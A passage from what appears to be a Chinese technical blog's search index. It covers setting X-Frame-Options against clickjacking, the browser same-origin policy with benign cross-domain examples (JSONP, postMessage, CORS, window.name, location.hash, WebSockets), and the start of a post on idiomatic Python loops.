<p>SAMEORIGIN：frame页面的地址只能为同源域名下的页面；</p>
<p>ALLOW-FROM origin：允许frame加载的页面地址；</p>
<p>PS：浏览器支持情况：IE8+、Opera10+、Safari4+、Chrome4.1.249.1042+、Firefox3.6.9。</p>
<p>具体的设置方法：</p>
<p><strong>Apache配置：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Header always append X-Frame-Options SAMEORIGIN</span><br></pre></td></tr></table></figure>
<p><strong>nginx配置：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">add_header X-Frame-Options SAMEORIGIN;</span><br></pre></td></tr></table></figure>
<p><strong>IIS配置：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;system.webServer&gt;</span><br><span class="line">    ...</span><br><span class="line">    &lt;httpProtocol&gt;</span><br><span class="line">        &lt;customHeaders&gt;</span><br><span class="line">            &lt;add name=<span class="string">"X-Frame-Options"</span> value=<span class="string">"SAMEORIGIN"</span> /&gt;</span><br><span class="line">        &lt;<span class="regexp">/customHeaders&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>httpProtocol&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;<span class="regexp">/system.webServer&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>界面操作劫持漏洞挖掘只需要确认：目标的HTTP响应头是否设置好了X-Frame-Options字段；目标是否又JavaScript的Frame Busting机制；更简单的是用iframe嵌入目标站点试试，如果成功，则证明漏洞存在。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>web前端黑客技术揭秘</p>
<p><a href="https://www.cnblogs.com/lovesong/p/5248483.html" target="_blank" rel="noopener">https://www.cnblogs.com/lovesong/p/5248483.html</a></p>
<p><a href="https://www.cnblogs.com/haq5201314/p/8992273.html" target="_blank" rel="noopener">https://www.cnblogs.com/haq5201314/p/8992273.html</a></p>
]]></content>
      <categories>
        <category>web前端相关</category>
      </categories>
      <tags>
        <tag>界面劫持</tag>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title>同源策略</title>
    <url>/2018/10/27/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</url>
    <content><![CDATA[<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><blockquote>
<p>浏览器的同源策略限制从一个源加载的文档或脚本如何域来自另一个源的资源进行交互。同源策略是浏览器的安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。只有同一个源的脚本赋予dom、读写cookie、session、Ajax等操作的权限。URL由协议、域名、端口、路径组成。简单来说就是两个URL的协议、域名、端口相同，则就是同源的；特殊情况、IE没有对端口做同源策略的限制、只验证了协议和域名。</p>
</blockquote>
<p>例如该地址 <a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a> 和以下地址对比</p>
<p>地址    同源    原因<br><a href="http://www.google.com" target="_blank" rel="noopener">http://www.google.com</a>                         否    协议不一致<br><a href="https://google.com" target="_blank" rel="noopener">https://google.com</a>                                   否    域名不一致<br><a href="https://www.google.com:81" target="_blank" rel="noopener">https://www.google.com:81</a>                 否    端口号不一致<br><a href="https://www.google.com/a/s.html" target="_blank" rel="noopener">https://www.google.com/a/s.html</a>    是    协议，域名和端口号都一致</p>
<h2 id="同源策略的限制"><a href="#同源策略的限制" class="headerlink" title="同源策略的限制"></a>同源策略的限制</h2><ul>
<li><p>存储在浏览器中的数据，如localStroage、Cooke和IndexedDB、cookie等不能通过脚本跨域访</p>
</li>
<li><p>不能通过脚本操作不同域下的DOM</p>
</li>
<li><p>不能通过ajax请求不同域的数据</p>
</li>
</ul>
<h2 id="可能的跨域资源嵌入实例"><a href="#可能的跨域资源嵌入实例" class="headerlink" title="可能的跨域资源嵌入实例"></a>可能的跨域资源嵌入实例</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">""</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">""</span>/&gt;标签嵌入css。由于css的松散的语法规则，css的跨域需要一个正确的content-type消息头。不用的浏览器有不同的限制。</span><br><span class="line">&lt;img&gt;嵌入图片</span><br><span class="line">&lt;video&gt;和&lt;audio&gt;嵌入多媒体资源</span><br><span class="line">&lt;object&gt;，&lt;embed&gt;和&lt;applet&gt;的插件</span><br><span class="line">@font-face引入的字体。一些浏览器允许跨域字体(cross-origin fonts),一些需要同源字体</span><br><span class="line">&lt;frame&gt;和&lt;iframe&gt;载入的任何资源。站点可以使用x-Frame-Options消息头来阻止这种形式的跨域交互</span><br></pre></td></tr></table></figure>
<h2 id="跨域问题"><a href="#跨域问题" class="headerlink" title="跨域问题"></a>跨域问题</h2><h3 id="jsonp跨域"><a href="#jsonp跨域" class="headerlink" title="jsonp跨域"></a>jsonp跨域</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JSONP（JSON with Padding）是数据格式JSON的一种“使用模式”，可以让网页从别的网域要数据。根据 XmlHttpRequest 对象受到同源策略的影响，而利用 &lt;script&gt;元素的这个开放策略，网页可以得到从其他来源动态产生的JSON数据，而这种使用模式就是所谓的 JSONP。用JSONP抓到的数据并不是JSON，而是任意的JavaScript，用 JavaScript解释器运行而不是用JSON解析器解析。所有，通过Chrome查看所有JSONP发送的Get请求都是js类型，而非XHR。</span><br><span class="line"> </span><br><span class="line">JSONP包含两部分：回调函数和数据。</span><br><span class="line">回调函数是当响应到来时要放在当前页面被调用的函数。</span><br><span class="line">数据就是传入回调函数中的json数据，也就是回调函数的参数了。</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleResponse</span>(<span class="params">response</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'The responsed data is: '</span>+response.data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">script.src = <span class="string">'http://www.baidu.com/json/?callback=handleResponse'</span>;</span><br><span class="line"><span class="built_in">document</span>.body.insertBefore(script, <span class="built_in">document</span>.body.firstChild);</span><br><span class="line"><span class="comment">/*handleResonse(&#123;"data": "zhe"&#125;)*/</span></span><br><span class="line"><span class="comment">//原理如下：</span></span><br><span class="line"><span class="comment">//当我们通过script标签请求时</span></span><br><span class="line"><span class="comment">//后台就会根据相应的参数(json,handleResponse)</span></span><br><span class="line"><span class="comment">//来生成相应的json数据(handleResponse(&#123;"data": "zhe"&#125;))</span></span><br><span class="line"><span class="comment">//最后这个返回的json数据(代码)就会被放在当前js文件中被执行</span></span><br><span class="line"><span class="comment">//至此跨域通信完成</span></span><br></pre></td></tr></table></figure>
<p><strong>缺点：</strong></p>
<ul>
<li>只能使用Get请求</li>
<li>不能注册success、error等事件监听函数，不能很容易的确定JSONP请求是否失败</li>
<li>JSONP是从其他域中加载代码执行，容易受到跨站请求伪造的攻击，其安全性无法确保</li>
</ul>
<h3 id="通过修改document-damain来进行跨域（主域相同）"><a href="#通过修改document-damain来进行跨域（主域相同）" class="headerlink" title="通过修改document.damain来进行跨域（主域相同）"></a>通过修改document.damain来进行跨域（主域相同）</h3><blockquote>
<p><strong>前提条件：这两个域名必须属于同一个基础域名!而且所用的协议，端口都要一致，否则无法利用<code>document.domain</code>进行跨域，所以只能跨子域</strong> 。 在<a href="https://developer.mozilla.org/en-US/docs/XPCOM_Interface_Reference/nsIEffectiveTLDService#getBaseDomain.28.29" target="_blank" rel="noopener">根域</a>范围内，允许把domain属性的值设置为它的上一级域。例如，在”aaa.xxx.com”域内，可以把domain设置为 “xxx.com” 但不能设置为 “xxx.org” 或者”com”</p>
</blockquote>
<p>比如：<a href="http://www.a.com/a.html和http://www.script.a.com/b.html" target="_blank" rel="noopener">http://www.a.com/a.html和http://www.script.a.com/b.html</a></p>
<p>1) 在<a href="http://www.a.com/a.html" target="_blank" rel="noopener">www.a.com/a.html</a>中：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">'a.com'</span>;</span><br><span class="line"><span class="keyword">var</span> ifr = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">ifr.src = <span class="string">'http://www.script.a.com/b.html'</span>;</span><br><span class="line">ifr.display = none;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(ifr);</span><br><span class="line">ifr.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">var</span> doc = ifr.contentDocument || ifr.contentWindow.document;</span><br><span class="line"> <span class="comment">//在这里操作doc，也就是b.html</span></span><br><span class="line"> ifr.onload = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
<p>2) 在<a href="http://www.script.a.com/b.html" target="_blank" rel="noopener">www.script.a.com/b.html</a>中：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.domain = <span class="string">'a.com'</span>;</span><br></pre></td></tr></table></figure>
<p>在两个html下通过js将<code>document.name = &#39;xxx.com&#39;;</code>设置一致，来达到互相访问的作用。</p>
<h3 id="使用window-name来进行跨域-gt"><a href="#使用window-name来进行跨域-gt" class="headerlink" title="使用window.name来进行跨域&gt;"></a>使用window.name来进行跨域&gt;</h3><blockquote>
<p><code>window.name</code>通过在iframe（一般动态创建i）中加载跨域HTML文件来起作用。然后，HTML文件将传递给请求者的字符串内容赋值给<code>window.name</code>。然后，请求者可以检索window.name值作为响应。</p>
</blockquote>
<ul>
<li>iframe标签的跨域能力；</li>
<li>window.name属性值在文档刷新后依旧存在的能力（且最大允许2M左右）</li>
</ul>
<p>比如：<a href="http://www.a.com/a.html和[http://www.b.com/b.html](http://www.script.a.com/b.html)" target="_blank" rel="noopener">http://www.a.com/a.html和[http://www.b.com/b.html](http://www.script.a.com/b.html)</a></p>
<p>1) a.html</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">  iframe.style.display = <span class="string">'none'</span>; <span class="comment">// 隐藏</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">var</span> state = <span class="number">0</span>; <span class="comment">// 防止页面无限刷新</span></span><br><span class="line">  iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(state === <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.parse(iframe.contentWindow.name));</span><br><span class="line">          <span class="comment">// 清除创建的iframe</span></span><br><span class="line">          iframe.contentWindow.document.write(<span class="string">''</span>);</span><br><span class="line">          iframe.contentWindow.close();</span><br><span class="line">          <span class="built_in">document</span>.body.removeChild(iframe);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(state === <span class="number">0</span>) &#123;</span><br><span class="line">          state = <span class="number">1</span>;</span><br><span class="line">          <span class="comment">// 加载完成，指向当前域，防止错误(proxy.html为空白页面)</span></span><br><span class="line">          <span class="comment">// Blocked a frame with origin "http://www.a.com/a.html" from accessing a cross-origin frame.</span></span><br><span class="line">          iframe.contentWindow.location = <span class="string">'http://www.a.com/a.html'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"> </span><br><span class="line">  iframe.src = <span class="string">'http://www.b.com/b.html'</span>;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>2)在b.com/b.html中包含</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">     <span class="built_in">window</span>.name = <span class="string">'要传送的内容'</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="使用HTML5新引进的window-postMessage方法"><a href="#使用HTML5新引进的window-postMessage方法" class="headerlink" title="使用HTML5新引进的window.postMessage方法"></a>使用HTML5新引进的window.postMessage方法</h3><blockquote>
<p> HTML5新特性，可以用来向其他所有的 window 对象发送消息。需要注意的是我们必须要保证所有的脚本执行完才发送 MessageEvent，如果在函数执行的过程中调用了它，就会让后面的函数超时无法执行。</p>
</blockquote>
<p>1) a.com/index.html：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line">&lt;iframe id=<span class="string">"ifr"</span> src=<span class="string">"b.com/index.html"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">var</span> ifr = <span class="built_in">document</span>.getElementById(<span class="string">'ifr'</span>);</span><br><span class="line">         <span class="keyword">var</span> targetOrigin = <span class="string">'http://b.com'</span>; <span class="comment">// 若写成'http://b.com/c/proxy.html'效果一样</span></span><br><span class="line">         <span class="comment">// 若写成'http://c.com'就不会执行postMessage了</span></span><br><span class="line">         ifr.contentWindow.postMessage(<span class="string">'I was there!'</span>, targetOrigin);</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>2) b.com/index.html：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">     <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">      <span class="comment">// 通过origin属性判断消息来源地址</span></span><br><span class="line">      <span class="keyword">if</span> (event.origin == <span class="string">'http://a.com'</span>) &#123;</span><br><span class="line">         alert(event.data); <span class="comment">// 弹出"I was there!"</span></span><br><span class="line">         alert(event.source); <span class="comment">// 对a.com、index.html中window对象的引用</span></span><br><span class="line">         <span class="comment">// 但由于同源策略，这里event.source不可以访问window对象</span></span><br><span class="line">      &#125;</span><br><span class="line">     &#125;, <span class="literal">false</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="CORS跨域"><a href="#CORS跨域" class="headerlink" title="CORS跨域"></a>CORS跨域</h3><blockquote>
<p>Cross-Origin Resource Sharing（CORS）跨域资源共享是一份浏览器技术的规范，提供了 Web 服务从不同域传来沙盒脚本的方法，以避开浏览器的同源策略，确保安全的跨域数据传输。现代浏览器使用CORS在API容器如XMLHttpRequest来减少HTTP请求的风险来源。与 JSONP 不同，CORS 除了 GET 要求方法以外也支持其他的 HTTP 要求。服务器一般需要增加如下响应头的一种或几种.</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Methods: POST, GET, OPTIONS</span><br><span class="line">Access-Control-Allow-Headers: X-PINGOTHER, Content-Type</span><br><span class="line">Access-Control-Max-Age: <span class="number">86400</span></span><br></pre></td></tr></table></figure>
<p>跨域请求默认不会携带Cookie信息，如果需要携带，请配置下述参数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">"Access-Control-Allow-Credentials"</span>: <span class="literal">true</span></span><br><span class="line"><span class="comment">// Ajax设置</span></span><br><span class="line"><span class="string">"withCredentials"</span>: <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>IE中对CORS的实现是xdr</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xdr = <span class="keyword">new</span> XDomainRequest();</span><br><span class="line">xdr.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="built_in">console</span>.log(xdr.responseText);</span><br><span class="line">&#125;</span><br><span class="line">xdr.open(<span class="string">'get'</span>, <span class="string">'http://www.baidu.com'</span>);</span><br><span class="line">......</span><br><span class="line">xdr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<p>其它浏览器中的实现就在xhr中</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="keyword">if</span>(xhr.readyState == <span class="number">4</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">304</span> || xhr.status == <span class="number">304</span>)&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(xhr.responseText);</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">xhr.open(<span class="string">'get'</span>, <span class="string">'http://www.baidu.com'</span>);</span><br><span class="line">......</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<p>实现跨浏览器的CORS</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createCORS</span>(<span class="params">method, url</span>)</span>&#123;</span><br><span class="line"> <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"> <span class="keyword">if</span>(<span class="string">'withCredentials'</span> <span class="keyword">in</span> xhr)&#123;</span><br><span class="line">  xhr.open(method, url, <span class="literal">true</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">typeof</span> XDomainRequest != <span class="string">'undefined'</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XDomainRequest();</span><br><span class="line">  xhr.open(method, url);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  xhr = <span class="literal">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> xhr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> request = createCORS(<span class="string">'get'</span>, <span class="string">'http://www.baidu.com'</span>);</span><br><span class="line"><span class="keyword">if</span>(request)&#123;</span><br><span class="line"> request.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   ......</span><br><span class="line"> &#125;;</span><br><span class="line"> request.send();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="动态创建script"><a href="#动态创建script" class="headerlink" title="动态创建script"></a><strong>动态创建script</strong></h3><p>script标签不受同源策略的限制。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadScript</span>(<span class="params">url, func</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">var</span> head = <span class="built_in">document</span>.head || <span class="built_in">document</span>.getElementByTagName(<span class="string">'head'</span>)[<span class="number">0</span>]; </span><br><span class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>); </span><br><span class="line">        script.src = url; </span><br><span class="line">        script.onload = script.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">this</span>.readyState || <span class="keyword">this</span>.readyState == <span class="string">'loaded'</span> || <span class="keyword">this</span>.readyState == <span class="string">'complete'</span>) &#123;  </span><br><span class="line">                func();  </span><br><span class="line">                script.onload = script.onreadystatechange = <span class="literal">null</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;; </span><br><span class="line">        head.insertBefore(script, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">window</span>.baidu = &#123; </span><br><span class="line">        sug: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123; </span><br><span class="line">            <span class="built_in">console</span>.log(data); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    loadScript(<span class="string">'http://suggestion.baidu.com/su?wd=w'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'loaded'</span>)</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">//我们请求的内容在哪里？</span></span><br><span class="line">    <span class="comment">//我们可以在chorme调试面板的source中看到script引入的内容</span></span><br></pre></td></tr></table></figure>
<h3 id="利用location-hash-跨域"><a href="#利用location-hash-跨域" class="headerlink" title="利用location.hash 跨域"></a>利用<strong>location.hash 跨域</strong></h3><p>原理是利用location.hash来进行传值。</p>
<p>假设域名a.com下的文件cs1.html要和cnblogs.com域名下的cs2.html传递信息。</p>
<p>1) cs1.html首先创建自动创建一个隐藏的iframe，iframe的src指向cnblogs.com域名下的cs2.html页面</p>
<p>2) cs2.html响应请求后再将通过修改cs1.html的hash值来传递数据</p>
<p>3) 同时在cs1.html上加一个定时器，隔一段时间来判断location.hash的值有没有变化，一旦有变化则获取获取hash值</p>
<p> 代码如下：  先是a.com下的文件cs1.html文件：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">startRequest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> ifr = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>); </span><br><span class="line">        ifr.style.display = <span class="string">'none'</span>; </span><br><span class="line">        ifr.src = <span class="string">'http://www.cnblogs.com/lab/cscript/cs2.html#paramdo'</span>;</span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(ifr);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkHash</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;           </span><br><span class="line">            <span class="keyword">var</span> data = location.hash ? location.hash.substring(<span class="number">1</span>) : <span class="string">''</span>;              </span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">console</span>.log) &#123;                   </span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">'Now the data is '</span> + data);                  </span><br><span class="line">            &#125;             </span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line">setInterval(checkHash, <span class="number">2000</span>);</span><br></pre></td></tr></table></figure>
<p>cnblogs.com域名下的cs2.html:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//模拟一个简单的参数处理操作</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">switch</span>(location.hash) &#123;     </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'#paramdo'</span>:</span><br><span class="line">          callBack();          </span><br><span class="line">        <span class="keyword">break</span>;         </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'#paramset'</span>:</span><br><span class="line">           <span class="comment">//do something……</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callBack</span>(<span class="params"></span>) </span>&#123;     </span><br><span class="line">    <span class="keyword">try</span> &#123;          </span><br><span class="line">        parent.location.hash = <span class="string">'somedata'</span>;         </span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">           <span class="comment">// ie、chrome的安全机制无法修改parent.location.hash，</span></span><br><span class="line">           <span class="comment">// 所以要利用一个中间的cnblogs域下的代理iframe          </span></span><br><span class="line">        <span class="keyword">var</span> ifrproxy = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);          </span><br><span class="line">        ifrproxy.style.display = <span class="string">'none'</span>;          </span><br><span class="line">        ifrproxy.src = <span class="string">'http://a.com/test/cscript/cs3.html#somedata'</span>; <span class="comment">// 注意该文件在"a.com"域下          </span></span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(ifrproxy);         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>a.com下的域名cs3.html：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//因为parent.parent和自身属于同一个域，所以可以改变其location.hash的值</span></span><br><span class="line"> </span><br><span class="line">parent.parent.location.hash = self.location.hash.substring(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<h3 id="web-sockets"><a href="#web-sockets" class="headerlink" title="web sockets"></a><strong>web sockets</strong></h3><blockquote>
<p>web sockets是一种浏览器的API，它的目标是在一个单独的持久连接上提供全双工、双向通信。(同源策略对web sockets不适用)</p>
<p>web sockets原理：在JS创建了web socket之后，会有一个HTTP请求发送到浏览器以发起连接。取得服务器响应后，建立的连接会使用HTTP升级从HTTP协议交换为web sockt协议。</p>
<p>只有在支持web socket协议的服务器上才能正常工作。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> socket = <span class="keyword">new</span> WebSockt(<span class="string">'ws://www.baidu.com'</span>);<span class="comment">//http-&gt;ws; https-&gt;wss</span></span><br><span class="line">socket.send(<span class="string">'hello WebSockt'</span>);</span><br><span class="line">socket.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line"> <span class="keyword">var</span> data = event.data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="nginx反向代理"><a href="#nginx反向代理" class="headerlink" title="nginx反向代理"></a>nginx反向代理</h3><p>可以不用目标服务器配合，不过需要搭建一个中转nginx服务器，用于转发请求。需要在运维层面修改，且有可能请求的资源并不再我们控制范围内（第三方），所以该方式不能作为通用的解决方案。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/maggie_live/article/details/80005177" target="_blank" rel="noopener">https://blog.csdn.net/maggie_live/article/details/80005177</a></p>
<p><a href="https://blog.csdn.net/animatecat/article/details/82744098" target="_blank" rel="noopener">https://blog.csdn.net/animatecat/article/details/82744098</a></p>
]]></content>
      <categories>
        <category>web前端相关</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>同源策略</tag>
      </tags>
  </entry>
  <entry>
    <title>python编程小技巧</title>
    <url>/2018/10/07/python%E7%BC%96%E7%A8%8B%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h2 id="python编程技巧总结："><a href="#python编程技巧总结：" class="headerlink" title="python编程技巧总结："></a>python编程技巧总结：</h2><blockquote>
<p>在python的编程中会使用各种各样的语法，通过一些小技巧可以优化python代码，学习总结如下。学习参考地址：<a href="https://github.com/JeffPaine/beautiful_idiomatic_python" target="_blank" rel="noopener">https://github.com/JeffPaine/beautiful_idiomatic_python</a></p>
</blockquote>
<h3 id="遍历一个序列"><a href="#遍历一个序列" class="headerlink" title="遍历一个序列"></a>遍历一个序列</h3><ol>
<li><p>python2:(xrange在遍历范围内创建一个迭代器，一次生成一个值，效率比range更高)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bad:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]:</span><br><span class="line">    <span class="keyword">print</span> i**<span class="number">2</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">print</span> i**<span class="number">2</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#better:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">print</span> i**<span class="number">2</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>python:(xrange更名为range，进行了优化)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">color = [<span class="string">'red'</span>,<span class="string">'green'</span>,<span class="string">'blue'</span>,<span class="string">'yello'</span>]</span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(color)):</span><br><span class="line">    print(color[i])</span><br><span class="line"><span class="comment">#better</span></span><br><span class="line"><span class="keyword">for</span> co <span class="keyword">in</span> color:</span><br><span class="line">    print(co)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="遍历倒序"><a href="#遍历倒序" class="headerlink" title="遍历倒序"></a>遍历倒序</h3><ul>
<li><p>python3:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">color = [<span class="string">'red'</span>,<span class="string">'green'</span>,<span class="string">'blue'</span>,<span class="string">'yello'</span>]</span><br><span class="line"><span class="comment">#bad</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(color)<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    print(color[i])</span><br><span class="line"><span class="comment">#better</span></span><br><span class="line"><span class="keyword">for</span> co <span class="keyword">in</span> reversed(color):</span><br><span class="line">    print(co)</span><br></pre></td></tr></table></figure>
</li>
</ul>
